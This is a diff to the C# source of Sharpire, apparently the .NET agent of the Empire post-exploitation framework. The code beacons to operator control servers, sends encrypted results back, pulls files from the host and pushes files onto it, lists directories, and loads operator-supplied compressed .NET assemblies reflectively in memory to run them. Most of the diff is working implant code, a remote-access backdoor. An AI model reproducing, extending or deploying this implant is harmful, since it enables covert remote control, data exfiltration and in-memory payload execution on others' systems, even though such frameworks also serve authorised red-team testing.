@@ -1,18 +1,11 @@
-﻿// Original Author: 0xbadjuju (https://github.com/0xbadjuju/Sharpire)
-// Updated and Modified by: Jake Krasnov (@_Hubbl3)
-// Project: Empire (https://github.com/BC-SECURITY/Empire)
-
-
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.IO;
-using System.IO.Pipes;
 using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Runtime.InteropServices;
 using System.Reflection;
-using System.Security.Cryptography;
 using System.Text;
 using System.Threading;
 
@@ -26,10 +19,7 @@ namespace Sharpire
         private int ServerIndex = 0;
 
         private JobTracking jobTracking;
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Default Constructor
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal Coms(SessionInfo sessionInfo)
         {
             this.sessionInfo = sessionInfo;
@@ -43,7 +33,7 @@ namespace Sharpire
                 encryptedBytesLength = encryptedBytes.Length;
             }
 
-            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentID());
+            byte[] data = Encoding.ASCII.GetBytes(sessionInfo.GetAgentId());
             byte lang = 0x03;
             data = Misc.combine(data, new byte[4] { lang, Convert.ToByte(meta), 0x00, 0x00 });
             data = Misc.combine(data, BitConverter.GetBytes(encryptedBytesLength));
@@ -60,10 +50,7 @@ namespace Sharpire
 
             return routingPacketData;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal void DecodeRoutingPacket(byte[] packetData, ref JobTracking jobTracking)
         {
             this.jobTracking = jobTracking;
@@ -94,12 +81,7 @@ namespace Sharpire
                 byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                 uint packetLength = BitConverter.ToUInt32(routingData, 12);
 
-                if (packetLength < 0)
-                {
-                    break;
-                }
-
-                if (sessionInfo.GetAgentID() == packetSessionId)
+                if (sessionInfo.GetAgentId() == packetSessionId)
                 {
                     byte[] encryptedData = packetData.Skip(offset).Take(offset + (int)packetLength - 1).ToArray();
                     offset += (int)packetLength;
@@ -127,39 +109,23 @@ namespace Sharpire
                 webClient.Headers.Add("Cookie", "session=" + routingCookie);
 
                 Random random = new Random();
-                string selectedTaskURI = sessionInfo.GetTaskURIs()[random.Next(0, sessionInfo.GetTaskURIs().Length)];
+                string selectedTaskURI = sessionInfo.GetTaskUrIs()[random.Next(0, sessionInfo.GetTaskUrIs().Length)];
                 results = webClient.DownloadData(sessionInfo.GetControlServers()[ServerIndex] + selectedTaskURI);
             }
-            catch (WebException webException)
+            catch (WebException)
             {
                 MissedCheckins++;
-                if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
-                {
-                    //Restart everything
-                }
+                // if ((int)((HttpWebResponse)webException.Response).StatusCode == 401)
+                // {
+                //     //Restart everything
+                // }
             }
             return results;
         }
 
         internal void SendMessage(byte[] packets)
         {
-            byte[] ivBytes = NewInitializationVector(16);
-            byte[] encryptedBytes = new byte[0];
-            using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
-            {
-                aesCrypto.Mode = CipherMode.CBC;
-                aesCrypto.Key = sessionInfo.GetSessionKeyBytes();
-                aesCrypto.IV = ivBytes;
-                ICryptoTransform encryptor = aesCrypto.CreateEncryptor();
-                encryptedBytes = encryptor.TransformFinalBlock(packets, 0, packets.Length);
-            }
-            encryptedBytes = Misc.combine(ivBytes, encryptedBytes);
-
-            HMACSHA256 hmac = new HMACSHA256();
-            hmac.Key = sessionInfo.GetSessionKeyBytes();
-            byte[] hmacBytes = hmac.ComputeHash(encryptedBytes).Take(10).ToArray();
-            encryptedBytes = Misc.combine(encryptedBytes, hmacBytes);
-
+            byte[] encryptedBytes = EmpireStager.AesEncryptThenHmac(sessionInfo.GetSessionKeyBytes(), packets);
             byte[] routingPacket = NewRoutingPacket(encryptedBytes, 5);
 
             Random random = new Random();
@@ -171,11 +137,11 @@ namespace Sharpire
                 webClient.Proxy = WebRequest.GetSystemWebProxy();
                 webClient.Proxy.Credentials = CredentialCache.DefaultCredentials;
                 webClient.Headers.Add("User-Agent", sessionInfo.GetUserAgent());
-                //Add custom headers
+
                 try
                 {
-                    string taskUri = sessionInfo.GetTaskURIs()[random.Next(sessionInfo.GetTaskURIs().Length)];
-                    byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
+                    string taskUri = sessionInfo.GetTaskUrIs()[random.Next(sessionInfo.GetTaskUrIs().Length)];
+                    webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                 }
                 catch (WebException) { }
             }
@@ -184,18 +150,14 @@ namespace Sharpire
 
         private void ProcessTaskingPackets(byte[] encryptedTask)
         {
-            byte[] taskingBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), encryptedTask);
+            byte[] taskingBytes = EmpireStager.AesDecryptAndVerify(sessionInfo.GetSessionKeyBytes(), encryptedTask);
             PACKET firstPacket = DecodePacket(taskingBytes, 0);
             byte[] resultPackets = ProcessTasking(firstPacket);
             SendMessage(resultPackets);
-
-            int offset = 12 + (int)firstPacket.length;
-            string remaining = firstPacket.remaining;
         }
 
         private byte[] ProcessTasking(PACKET packet)
         {
-            byte[] returnPacket = new byte[0];
             try
             {
                 int type = packet.type;
@@ -227,7 +189,7 @@ namespace Sharpire
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return EncodePacket(1, systemInformation, packet.taskId);
                     case 2:
-                        string message = "[!] Agent " + sessionInfo.GetAgentID() + " exiting";
+                        string message = "[!] Agent " + sessionInfo.GetAgentId() + " exiting";
                         SendMessage(EncodePacket(2, message, packet.taskId));
                         Environment.Exit(0);
                         return new byte[0];
@@ -236,7 +198,6 @@ namespace Sharpire
                         string output;
                         if (parts[0] == "Set-Delay")
                         {
-                            Console.WriteLine("Current delay" + sessionInfo.GetDefaultDelay());
                             sessionInfo.SetDefaultDelay(UInt32.Parse(parts[1]));
                             sessionInfo.SetDefaultJitter(UInt32.Parse(parts[2]));
                             output = "Delay set to " + parts[1] + " Jitter set to " + parts[2];
@@ -260,9 +221,6 @@ namespace Sharpire
                         return Task42(packet);
                     case 43:
                         return Task43(packet);
-                    case 44:
-                        jobTracking.jobs[taskId.ToString()].Status = "completed";
-                        return Task44(packet);
                     case 50:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return GenerateRunningJobsTable(packet);
@@ -275,18 +233,16 @@ namespace Sharpire
                     case 101:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task101(packet);
-                    case 110:
+                    case 102:
                         jobTracking.StartAgentJob(packet.data, packet.taskId);
                         jobTracking.jobs[taskId.ToString()].Status = "running";
                         return EncodePacket(packet.type, "Job started: " + taskId.ToString(), packet.taskId);
-                    case 111:
-                        return EncodePacket(packet.type, "Not Implemented", packet.taskId);
                     case 120:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return Task120(packet);
-                    case 121:
+                    case 122:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
-                        return Task121(packet);
+                        return Task122(packet);
                     default:
                         jobTracking.jobs[taskId.ToString()].Status = "error";
                         return EncodePacket(0, "Invalid type: " + packet.type, packet.taskId);
@@ -315,10 +271,7 @@ namespace Sharpire
             string tableString = table.ToString();
             return EncodePacket(packet.type, tableString, packet.taskId);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Check this one for UTF8 Errors
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal byte[] EncodePacket(ushort type, string data, ushort resultId)
         {
             data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
@@ -336,10 +289,7 @@ namespace Sharpire
 
             return packet;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         [StructLayout(LayoutKind.Sequential, Pack = 1)]
         public struct PACKET
         {
@@ -352,10 +302,7 @@ namespace Sharpire
             public string data;
             public string remaining;
         };
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private PACKET DecodePacket(byte[] packet, int offset)
         {
             PACKET packetStruct = new PACKET();
@@ -371,10 +318,7 @@ namespace Sharpire
             packet = null;
             return packetStruct;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Working
-        ////////////////////////////////////////////////////////////////////////////////
+        
         internal static byte[] NewInitializationVector(int length)
         {
             Random random = new Random();
@@ -385,10 +329,7 @@ namespace Sharpire
             }
             return initializationVector;
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Download File from Agent
-        ////////////////////////////////////////////////////////////////////////////////
+        
         public byte[] Task41(PACKET packet)
         {
             try
@@ -423,8 +364,7 @@ namespace Sharpire
                 return EncodePacket(0, $"[!] Error: {ex.Message}", packet.taskId);
             }
         }
-
-
+        
         private string ParsePath(string[] parts, out bool isChunkSizeAdjusted)
         {
             isChunkSizeAdjusted = false;
@@ -475,10 +415,7 @@ namespace Sharpire
 
             } while (true);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Upload File to Agent
-        ////////////////////////////////////////////////////////////////////////////////
+        
         private byte[] Task42(PACKET packet)
         {
             string[] parts = packet.data.Split('|');
@@ -533,7 +470,7 @@ namespace Sharpire
 
             if (path.Equals("/"))
             {
-            // if the path is root, list drives as directories
+                // if the path is root, list drives as directories
                 sb.Append("{ \"directory_name\": \"/\", \"directory_path\": \"/\", \"items\": [");
                 DriveInfo[] allDrives = DriveInfo.GetDrives();
                 foreach (DriveInfo d in allDrives)
@@ -554,12 +491,10 @@ namespace Sharpire
             }
             else if (!Directory.Exists(path))
             {
-                // if path doesn't exist
                 sb.Append("Directory " + path + " not found.");
             }
             else
             {
-                // Process the list of files found in the directory.
                 string fullPath = Path.GetFullPath(path);
                 string[] split = fullPath.Split('\\');
                 string dirName = split[split.Length - 1];
@@ -580,108 +515,115 @@ namespace Sharpire
                         .Append("\", \"is_file\": ")
                         .Append(File.Exists(filePath) ? "true" : "false")
                         .Append(" },");
+                }
+                sb.Remove(sb.Length - 1, 1);
+                sb.Append("] }");
             }
-            sb.Remove(sb.Length - 1, 1);
-            sb.Append("] }");
-          }
             return EncodePacket(packet.type, sb.ToString(), packet.taskId);
         }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        // Excute assembly tasking
-        ////////////////////////////////////////////////////////////////////////////////
-
-        //Since Empire is using the COvenant tasks this is just taken from the Covenant Grunt
-        // https://github.com/cobbr/Covenant/blob/master/Covenant/Data/Grunt/GruntHTTP/GruntHTTP.cs#L236
-        public Byte[] Task44(PACKET packet)
+        
+        public Byte[] Task122(PACKET packet)
         {
-            const int Delay = 1;
+            const int delay = 1;
             const int MAX_MESSAGE_SIZE = 1048576;
             string output = "";
+            object synclock = new object();
+
+            // Split packet data
             string[] parts = packet.data.Split(',');
             if (parts.Length > 0)
             {
-                object[] parameters = null;
-                if (parts.Length > 1) { parameters = new object[parts.Length - 1]; }
-                for (int i = 1; i < parts.Length; i++) { parameters[i - 1] = parts[i]; }
+                // Assuming the Base64 encoded JSON is in parts[1]
+                string base64JsonString = parts[1];
+                string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
+
+                // Manually parse JSON to extract all values as a generic string array
+                var parametersList = new List<string>();
+                jsonString = jsonString.Trim('{', '}'); // Remove braces if present
+                string[] keyValuePairs = jsonString.Split(',');
+
+                foreach (string pair in keyValuePairs)
+                {
+                    string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
+                    if (keyValue.Length == 2)
+                    {
+                        string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
+                        parametersList.Add(value);
+                    }
+                }
+
+                string[] parameters = parametersList.ToArray();
+
+                // Decompress and load the assembly
                 byte[] compressedBytes = Convert.FromBase64String(parts[0]);
                 byte[] decompressedBytes = Decompress(compressedBytes);
                 Assembly agentTask = Assembly.Load(decompressedBytes);
-                PropertyInfo streamProp = agentTask.GetType("Task").GetProperty("OutputStream");
-                string results = "";
-                if (streamProp == null)
+
+                // Create a background thread for the task
+                Thread taskThread = new Thread(() =>
                 {
-                    results = (string) agentTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters);
-                    Console.WriteLine(results);
-                    return EncodePacket(packet.type, results, packet.taskId);
-                }
-                else
-                {
-                    Thread invokeThread = new Thread(() => results = (string) agentTask.GetType("Task").GetMethod("Execute").Invoke(null, parameters));
-                    using (AnonymousPipeServerStream pipeServer = new AnonymousPipeServerStream(PipeDirection.In, HandleInheritability.Inheritable))
+                    using (StringWriter consoleOutput = new StringWriter())
                     {
-                        using (AnonymousPipeClientStream pipeClient = new AnonymousPipeClientStream(PipeDirection.Out, pipeServer.GetClientHandleAsString()))
+                        TextWriter originalConsoleOut = Console.Out;
+                        try
                         {
-                            streamProp.SetValue(null, pipeClient, null);
-                            DateTime lastTime = DateTime.Now;
-                            invokeThread.Start();
-                            using (StreamReader reader = new StreamReader(pipeServer))
+                            Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
+
+                            // Verify parameters and invoke Main method
+                            MethodInfo mainMethod = agentTask.GetType("Program").GetMethod("Main");
+                            if (mainMethod != null)
                             {
-                                object synclock = new object();
-                                string currentRead = "";
-                                Thread readThread = new Thread(() => {
-                                    int count;
-                                    char[] read = new char[MAX_MESSAGE_SIZE];
-                                    while ((count = reader.Read(read, 0, read.Length)) > 0)
-                                    {
-                                        lock (synclock)
-                                        {
-                                            currentRead += new string(read, 0, count);
-                                        }
-                                    }
-                                });
-                                readThread.Start();
-                                while (readThread.IsAlive)
+                                mainMethod.Invoke(null, new object[] { parameters });
+                            }
+                            else
+                            {
+                                lock (synclock)
                                 {
-                                    Thread.Sleep(Delay * 1000);
-                                    lock (synclock)
-                                    {
-                                        try
-                                        {
-                                            if (currentRead.Length >= MAX_MESSAGE_SIZE)
-                                            {
-                                                for (int i = 0; i < currentRead.Length; i += MAX_MESSAGE_SIZE)
-                                                {
-                                                    string aRead = currentRead.Substring(i, Math.Min(MAX_MESSAGE_SIZE, currentRead.Length - i));
-                                                    try
-                                                    {
-                                                       // need to update this later. Was using a covenant specific class. Need to reimplement in Empire
-                                                    }
-                                                    catch (Exception) {}
-                                                }
-                                                currentRead = "";
-                                                lastTime = DateTime.Now;
-                                            }
-                                            else if (currentRead.Length > 0 && DateTime.Now > (lastTime.Add(TimeSpan.FromSeconds(Delay))))
-                                            {
-                                                // need to update this later. Was using a covenant specific class. Need to reimplement in Empire
-                                            }
-                                        }
-                                        catch (ThreadAbortException) { break; }
-                                        catch (Exception) { currentRead = ""; }
-                                    }
+                                    output += "[ERROR] Main method not found in Program class.\n";
                                 }
-                                output += currentRead;
                             }
                         }
+                        catch (TargetInvocationException ex)
+                        {
+                            // Capture and log the inner exception details
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] {ex.InnerException?.Message ?? ex.Message}\n";
+                                output += $"{ex.InnerException?.StackTrace ?? ex.StackTrace}\n";
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            // General exception logging
+                            lock (synclock)
+                            {
+                                output += $"[ERROR] {ex.Message}\n{ex.StackTrace}\n";
+                            }
+                        }
+                        finally
+                        {
+                            Console.SetOut(originalConsoleOut); // Restore original Console.Out
+                        }
+
+                        lock (synclock) // Safely add console output
+                        {
+                            output += consoleOutput.ToString();
+                        }
                     }
-                    invokeThread.Join();
-                }
-                output += results;
+                });
+
+                // Start the task thread
+                taskThread.IsBackground = true;
+                taskThread.Start();
+                taskThread.Join(); // Wait for task to complete
+
+                // Return the final output to the agent once the task completes
                 return EncodePacket(packet.type, output, packet.taskId);
             }
-            return EncodePacket(packet.type,"invalid packet",packet.taskId);
+
+            return EncodePacket(packet.type, "Invalid packet", packet.taskId);
         }
+
 
         ////////////////////////////////////////////////////////////////////////////////
         // Kill Job
@@ -716,27 +658,92 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        // Load PowerShell Script
-        ////////////////////////////////////////////////////////////////////////////////
-        public byte[] Task120(PACKET packet)
-        {
-            Random random = new Random();
-            byte[] initializationVector = new byte[16];
-            random.NextBytes(initializationVector);
-            jobTracking.ImportedScript = EmpireStager.aesEncrypt(sessionInfo.GetSessionKeyBytes(), initializationVector, Encoding.ASCII.GetBytes(packet.data));
-            return EncodePacket(packet.type, "Script successfully saved in memory", packet.taskId);
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
         // Run an Agent Job
         ////////////////////////////////////////////////////////////////////////////////
-        public byte[] Task121(PACKET packet)
+        public Byte[] Task120(PACKET packet)
         {
-            byte[] scriptBytes = EmpireStager.aesDecrypt(sessionInfo.GetSessionKey(), jobTracking.ImportedScript);
-            string script = Encoding.UTF8.GetString(scriptBytes);
-             jobTracking.StartAgentJob(script + ";" + packet.data, packet.taskId);
-            return EncodePacket(packet.type, "Job started: " + packet.taskId, packet.taskId);
+            const int MAX_MESSAGE_SIZE = 1048576;
+            string output = "";
+            object synclock = new object(); // Define synclock for synchronization
+
+            // Split packet data
+            string[] parts = packet.data.Split(',');
+            if (parts.Length > 0)
+            {
+                // Assuming the Base64 encoded JSON is in parts[1]
+                string base64JsonString = parts[1];
+                string jsonString = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(base64JsonString));
+
+                // Manually parse JSON to extract all values as a generic string array
+                var parametersList = new List<string>();
+                jsonString = jsonString.Trim('{', '}'); // Remove braces if present
+                string[] keyValuePairs = jsonString.Split(',');
+
+                foreach (string pair in keyValuePairs)
+                {
+                    string[] keyValue = pair.Split(new[] { ':' }, 2); // Split only on the first colon
+                    if (keyValue.Length == 2)
+                    {
+                        string value = keyValue[1].Trim().Trim('"'); // Remove extra spaces and quotes
+                        parametersList.Add(value);
+                    }
+                }
+
+                // Convert list to array and log the parsed values
+                string[] parameters = parametersList.ToArray();
+
+                // Decompress and load the assembly
+                byte[] compressedBytes = Convert.FromBase64String(parts[0]);
+                byte[] decompressedBytes = Decompress(compressedBytes);
+                Assembly agentTask = Assembly.Load(decompressedBytes);
+
+                // Execute assembly and capture output synchronously
+                using (StringWriter consoleOutput = new StringWriter())
+                {
+                    TextWriter originalConsoleOut = Console.Out;
+                    try
+                    {
+                        Console.SetOut(consoleOutput); // Redirect Console.Out to capture output
+
+                        // Verify parameters and invoke Main method
+                        MethodInfo mainMethod = agentTask.GetType("Program").GetMethod("Main");
+                        if (mainMethod != null)
+                        {
+                            mainMethod.Invoke(null, new object[] { parameters });
+                        }
+                        else
+                        {
+                            lock (synclock)
+                            {
+                                output += "[ERROR] Main method not found in Program class.";
+                            }
+                        }
+                    }
+                    catch (TargetInvocationException ex)
+                    {
+                        lock (synclock)
+                        {
+                            output += $"[ERROR] {ex.InnerException?.Message ?? ex.Message}\n{ex.InnerException?.StackTrace ?? ex.StackTrace}";
+                        }
+                    }
+                    finally
+                    {
+                        Console.SetOut(originalConsoleOut); // Restore original Console.Out
+                    }
+
+                    lock (synclock) // Safely add console output
+                    {
+                        output += consoleOutput.ToString();
+                    }
+                }
+
+                // Return the captured output to the agent
+                return EncodePacket(packet.type, output, packet.taskId);
+            }
+
+            return EncodePacket(packet.type, "Invalid packet", packet.taskId);
         }
+
         //Decompress function may want to move this somewhere else at some point
         //taken from Covenant https://github.com/cobbr/Covenant/tree/master/Covenant
         public static byte[] Decompress(byte[] compressed)
